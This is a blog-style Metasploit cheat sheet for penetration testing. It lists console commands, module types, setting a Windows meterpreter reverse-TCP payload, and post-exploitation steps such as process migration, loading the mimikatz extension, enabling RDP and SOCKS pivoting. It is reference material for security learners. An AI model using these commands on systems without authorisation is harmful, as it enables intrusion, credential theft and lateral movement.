---
title: CheatSheet - Metasploit
author: 4n3i5v74
date: 2020-12-01 09:00:00 +0530
categories: [CheatSheet, Metasploit]
tags: [cheatsheet, metasploit, pentest]
pin: true
---


## Initializing

- `msfdb init` - initialize database. `Msfconsole` supports only postgresql databases.
- `msfconsole -q` - quietly launch `msfconsole` without banner.
- `db_status` - check database connectivity from `msfconsole`


## Framework architecture

- Modules (exploit, payload, encoder, nop, auxiliary)
- Libraries (msf base, msf core, rex)
- Tools
- Plugins
- Interfaces (console, cli, rpc, gui & armitage)


## Commands

- `search` - search for modules
- `use` - use the module
- `info` - view info on module
- `connect` - netcat like command to check host connectivity
- `set` - change value of variable
- `setg` - change value of variable globally
- `get` - view value of variable
- `unset` - set null/no value to variable
- `spool` - write console output into a file as well the screen
- `save` - store the settings/active datastores to a settings file


## Modules

- `exploit` - most common module utilized, which holds all of the exploit code
- `payload` - module used hand in hand with exploits, contains the various bits of shellcode
- `auxiliary` - module commonly used in scanning and verification to see if machines are exploitable
- `post` - provides looting and pivoting after exploitation
- `encoder` - module commonly utilized in payload obfuscation, to modify the `appearance` of exploit and avoid signature detection
- `nop` - module used with buffer overflow and ROP attacks
- `load` - load different module


## Command examples and Navigation

- `db_nmap -Pn -T4 -sS -sV --top_ports 1000 <ip>` - nmap scan within `msfconsole` terminal
- `hosts` - host information gathered
- `services` - service infomation gathered
- `vulns` - vulnerability information gathered
- `search multi/handler` - search for module `multi/handler`
- `use 6` - use `6`th result from search
- `set PAYLOAD windows/meterpreter/reverse_tcp` - set payload as meterpreter reverse tcp
- `use icecast` - use `icecast` payload, if no payload configured for use in `icecast`, `windows/meterpreter/reverse_tcp` will be used
- `options` - check currently set variables for use in exploit
- `exploit` - start exploit and gain shell, `meterpreter` shell if default
- `sessions` - get existing backgrounded sessions
- `jobs` - get existing backgrounded job runs


## Post-exploitation

The following commands are used in `meterpreter` shell across a `windows` target.

- `ps` - list running processes
- `migrate <pid>` - migrate from exploited process to another running process
- `getuid` - get current username
- `sysinfo` - system information
- `getprivs` - get current privileges
- `ipconfig` - get ip information
- `load kiwi` - load latest version of mimikatz extension
- `upload test c:\user\test\desktop` - upload file
- `run post/windows/gather/checkvm` - run post script to check if target is a VM
- `run post/multi/recon/local_exploit_suggester` - run post script to check suggested exploits
- `run post/windows/manage/enable_rdp` - run post script to try to enable rdp
- `shell` - spawn a shell to interact with target internally
- `bg` - background the meterpreter shell



## Network options

- `run autoroute -h` - run post script on how to use autoroute to configure target networking
- `search server/socks` - search available socks module
- `use server/socks5` - initiate a socks proxy server from meterpreter terminal

